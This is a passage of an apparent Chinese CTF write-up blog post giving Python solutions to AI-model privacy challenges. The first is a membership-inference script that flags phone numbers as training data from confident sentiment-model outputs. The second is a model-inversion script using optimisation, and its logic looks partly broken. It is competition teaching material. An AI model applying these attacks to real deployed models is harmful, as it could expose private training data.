</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;phone.csv&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>reader</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>reader</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>phone_list</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>reader</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>results</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>id</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=c1># 发送查询请求并分析概率变化</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>phone_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>phone</span> <span class=o>=</span> <span class=n>row</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>predict_sentiment</span><span class=p>(</span><span class=n>phone</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 提取模型输出的情感分类概率</span>
</span></span><span class=line><span class=cl>    <span class=n>probability</span> <span class=o>=</span> <span class=n>res</span><span class=p>[</span><span class=s1>&#39;probability&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=c1># 分析概率变化，这里假设如果positive概率异常高或negative概率异常低，可能是训练集手机号</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>probability</span> <span class=o>&gt;</span> <span class=mf>0.9</span> <span class=ow>or</span> <span class=n>probability</span> <span class=o>&lt;</span> <span class=mf>0.1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>results</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=nb>id</span><span class=p>,</span> <span class=s1>&#39;is_train_data&#39;</span><span class=p>:</span> <span class=kc>True</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>results</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=nb>id</span><span class=p>,</span> <span class=s1>&#39;is_train_data&#39;</span><span class=p>:</span> <span class=kc>False</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=nb>id</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=c1># 保存结果到submit.csv</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;submit.csv&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>newline</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>writer</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>DictWriter</span><span class=p>(</span><span class=n>file</span><span class=p>,</span> <span class=n>fieldnames</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=s1>&#39;is_train_data&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>writer</span><span class=o>.</span><span class=n>writeheader</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>result</span> <span class=ow>in</span> <span class=n>results</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>writer</span><span class=o>.</span><span class=n>writerow</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=模型隐私攻击-2>模型隐私攻击 2</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>joblib</span> <span class=kn>import</span> <span class=n>load</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scipy.optimize</span> <span class=kn>import</span> <span class=n>minimize</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>csv</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;反演样本数据集_1000条.csv&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>reader</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>reader</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>phone_list</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>reader</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>loaded_vectorizer</span> <span class=o>=</span> <span class=n>load</span><span class=p>(</span><span class=s1>&#39;tfidf_vectorizer.pkl&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>model</span> <span class=o>=</span> <span class=n>load</span><span class=p>(</span><span class=s1>&#39;sentiment_model.pkl&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>vocabulary</span> <span class=o>=</span> <span class=n>loaded_vectorizer</span><span class=o>.</span><span class=n>get_feature_names_out</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_text</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>original_text</span> <span class=o>=</span> <span class=n>vocabulary</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>original_text</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=nb>id</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>results</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>loss</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>prob</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>prob</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=o>**</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>phone_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>v</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>random</span><span class=o>.</span><span class=n>rand</span><span class=p>(</span><span class=mi>7237</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>phone</span> <span class=o>=</span> <span class=p>[</span><span class=n>row</span><span class=p>[</span><span class=mi>1</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=nb>float</span><span class=p>(</span><span class=n>row</span><span class=p>[</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>ans</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>row</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ans</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>         <span class=n>data</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>-</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>    <span class=n>features</span> <span class=o>=</span> <span class=n>loaded_vectorizer</span><span class=o>.</span><span class=n>transform</span><span class=p>(</span><span class=n>phone</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>features</span> <span class=o>+=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>    <span class=n>prob</span> <span class=o>=</span> <span class=n>model</span><span class=o>.</span><span class=n>predict_proba</span><span class=p>(</span><span class=n>np</span><span class=o>.</span><span class=n>asarray</span><span class=p>(</span><span class=n>features</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>minimize</span><span class=p>(</span><span class=n>loss</span><span class=p>,</span><span class=n>v</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>data</span><span class=p>,</span><span class=n>prob</span><span class=p>),</span><span class=n>method</span><span class=o>=</span><span class=s1>&#39;BFGS&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>argmax</span><span class=p>(</span><span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>text</span> <span class=o>=</span> <span class=n>get_text</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>results</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s1>&#39;sample_id&#39;</span><span class=p>:</span> <span class=nb>id</span><span class=p>,</span> <span class=s1>&#39;inversion_samples&#39;</span><span class=p>:</span> <span class=n>text</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=nb>id</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;submit.csv&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>newline</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>writer</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>DictWriter</span><span class=p>(</span><span class=n>file</span><span class=p>,</span> <span class=n>fieldnames</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;sample_id&#39;</span><span class=p>,</span> <span class=s1>&#39;inversion_samples&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>writer</span><span class=o>.</span><span class=n>writeheader</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>result</span> <span class=ow>in</span> <span class=n>results</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>writer</span><span class=o>.</span><span class=n>writerow</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a>
<a href=/tags/ai/>AI</a>
<a href=/tags/wp/>WP</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E5%88%9D%E8%B5%9Bwp/><div class=article-details><h2 class=article-title>强网青少初赛WP</h2></div></a></article><article><a href=/p/buildctf-wp-misc%E9%83%A8%E5%88%86/><div class=article-details><h2 class=article-title>BuildCTF WP Misc部分</h2></div></a></article><article><a href=/p/newstar-%E7%AC%AC%E4%B8%80%E5%91%A8-wp/><div class=article-details><h2 class=article-title>NewStar 第一周 WP</h2></div></a></article><article><a href=/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/><div class=article-details><h2 class=article-title>编码系列</h2></div></a></article><article><a href=/p/tsctf-j-wp/><div class=article-details><h2 class=article-title>TSCTF-J wp</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=XiaoYuan-420/XiaoYuan-420.github.io data-repo-id=R_kgDOM4D09g data-category=Announcements data-category-id=DIC_kwDOM4D09s4Ci3v5 data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=preferred_color_scheme data-lang=en crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"preferred_color_scheme":"dark_tritanopia")}})()</script><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 XiaoYuan</section><section class=powerby>网站总访客数：<span id=busuanzi_value_site_uv>Loading</span><br>网站总访问量：<span id=busuanzi_value_site_pv>Loading</span><br>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.27.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script defer src=https://cn.vercount.one/js></script></body></html>